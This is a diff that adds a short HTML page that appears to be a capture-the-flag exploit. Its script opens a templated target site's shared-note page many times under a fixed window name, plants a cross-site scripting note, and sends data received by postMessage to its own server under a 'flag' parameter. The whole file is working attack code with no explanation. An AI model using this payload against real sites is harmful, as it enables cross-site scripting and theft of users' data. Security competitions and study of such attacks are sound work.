@@ -1,0 +1,26 @@
+<html>
+
+<body>
+    <script>
+        const sleep = (ms) => new Promise((resolve) => setInterval(resolve, ms))
+        const TARGET = "{{target}}";
+        (async () => {
+            for (var id = 1; id <= 32; id++) {
+                const res = await fetch("/create_next_note")
+                const text = await res.text()
+                console.log(text)
+                open(TARGET + `/share/read#id=${text}&username={{username}}`, "sold")
+            }
+            const res = await fetch("/create_xss")
+            const text = await res.text()
+            console.log(text)
+            const w = open(TARGET+`/share/read#id=${text}&username={{username}}`, "sold")
+            addEventListener("message", (ev)=>{
+                fetch("/?flag="+ev.data)
+            })
+        })()
+    </script>
+</body>
+
+
+</html>
